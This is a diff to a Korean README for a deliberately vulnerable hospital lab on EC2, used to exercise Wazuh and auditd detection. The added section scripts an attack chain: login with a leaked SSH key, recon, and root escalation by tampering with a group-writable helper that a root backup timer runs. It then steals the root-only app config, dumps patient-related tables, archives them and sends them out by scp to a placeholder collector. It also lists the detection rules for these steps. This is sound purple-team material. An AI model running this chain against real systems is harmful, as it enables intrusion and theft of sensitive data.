@@ -75,3 +75,106 @@ nc -vz -w 3 <EC2_PUBLIC_IP> 5433
 ```
 
 SQLi 요청은 `403 Forbidden`과 `X-Request-ID`가 포함된 커스텀 차단 페이지가 기대값입니다.
+
+## 유출 SSH 키 기반 EC2 침해 실습
+
+이 인프라는 앱 EC2에 유출 SSH 키 시나리오용 `deploy` 계정과 의도적으로 취약한 root 백업 작업을 함께 구성합니다.
+
+구성 요소:
+
+- `deploy` 계정: `ssh/vuln-hospital-lab.pem` 키로 접속 가능, `hospital-ops` 그룹 소속
+- `/etc/systemd/system/hospital-db-backup.timer`: root 권한으로 15분마다 백업 서비스 실행
+- `/usr/local/sbin/hospital-db-backup.sh`: root 소유 백업 스크립트
+- `/opt/hospital/bin/hospital-backup-helper`: root 백업 스크립트가 호출하지만 `hospital-ops` 그룹에 쓰기 권한이 있는 취약 헬퍼
+- `/etc/vuln-hospital-booking/app.env`: root만 읽을 수 있는 DB/S3 앱 설정
+- auditd/Wazuh FIM: 정찰 명령, 백업 경로 조사, 헬퍼 변조, root 표식 파일, 설정 복사, 수집/압축/전송/삭제 행위 감시
+
+초기 접근:
+
+```bash
+ssh -i ssh/vuln-hospital-lab.pem deploy@<APP_EC2_PUBLIC_IP>
+```
+
+정찰 및 취약 경로 확인:
+
+```bash
+whoami
+id
+groups
+sudo -l
+hostname
+uname -a
+ip addr
+docker compose ps
+systemctl list-timers --all
+systemctl cat hospital-db-backup.timer
+systemctl cat hospital-db-backup.service
+ls -l /usr/local/sbin/hospital-db-backup.sh
+ls -ld /opt/hospital/bin
+ls -l /opt/hospital/bin/hospital-backup-helper
+namei -l /opt/hospital/bin/hospital-backup-helper
+```
+
+권한 상승 검증용 헬퍼 변조 예시:
+
+```bash
+cp /opt/hospital/bin/hospital-backup-helper /opt/hospital/bin/hospital-backup-helper.orig
+cat > /opt/hospital/bin/hospital-backup-helper <<'EOF'
+#!/usr/bin/env bash
+set -euo pipefail
+mkdir -p /tmp/wazuh-edr-lab
+id > /tmp/wazuh-root-proof
+cp /etc/vuln-hospital-booking/app.env /tmp/wazuh-edr-lab/app.env
+chmod 644 /tmp/wazuh-root-proof /tmp/wazuh-edr-lab/app.env
+exec /opt/hospital/bin/hospital-backup-helper.orig
+EOF
+chmod 775 /opt/hospital/bin/hospital-backup-helper
+```
+
+다음 타이머 실행까지 남은 시간을 확인한 뒤 기다립니다.
+
+```bash
+systemctl list-timers hospital-db-backup.timer
+```
+
+검증 파일:
+
+```bash
+cat /tmp/wazuh-root-proof
+cat /tmp/wazuh-edr-lab/app.env
+```
+
+DB 조회와 수집/압축/전송 테스트는 실습용 더미 데이터만 대상으로 수행합니다.
+
+```bash
+set -a
+. /tmp/wazuh-edr-lab/app.env
+set +a
+mkdir -p /tmp/wazuh-edr-lab-collection
+PGPASSWORD="$DATABASE_PASSWORD" psql -h "$DATABASE_HOST" -U "$DATABASE_USER" -d "$DATABASE_NAME" \
+  -c "\\copy (select id, username, full_name, email, role from users) to '/tmp/wazuh-edr-lab-collection/users.csv' csv header"
+PGPASSWORD="$DATABASE_PASSWORD" psql -h "$DATABASE_HOST" -U "$DATABASE_USER" -d "$DATABASE_NAME" \
+  -c "\\copy (select id, status, reason, created_at from appointments) to '/tmp/wazuh-edr-lab-collection/appointments.csv' csv header"
+PGPASSWORD="$DATABASE_PASSWORD" psql -h "$DATABASE_HOST" -U "$DATABASE_USER" -d "$DATABASE_NAME" \
+  -c "\\copy (select id, title, document_type, classification, file_path from medical_documents) to '/tmp/wazuh-edr-lab-collection/medical_documents.csv' csv header"
+tar -czf /tmp/wazuh-edr-lab-collection.tar.gz -C /tmp wazuh-edr-lab-collection
+```
+
+외부 수집 서버가 있을 때만 반출 이벤트를 생성합니다.
+
+```bash
+scp /tmp/wazuh-edr-lab-collection.tar.gz <collector_user>@<collector_ip>:/tmp/
+```
+
+주요 커스텀 Wazuh 룰 ID:
+
+- `100170`: 계정/시스템 정찰 명령
+- `100171`: 백업 타이머 및 root 서비스 조사
+- `100172`: `/opt/hospital/bin/hospital-backup-helper` FIM 변경
+- `100173`: `/tmp/wazuh-root-proof` root 권한 표식
+- `100174`: root 전용 앱 설정 접근 또는 `/tmp` 스테이징
+- `100175`: PostgreSQL 데이터 조회/수집
+- `100176`: `/tmp` 수집 데이터 압축
+- `100177`: `scp`, `curl`, `nc` 기반 반출 시도
+- `100178`: 수집물 또는 셸 히스토리 삭제 시도
+- `100179`: root 표식 이후 민감 설정 접근 상관분석
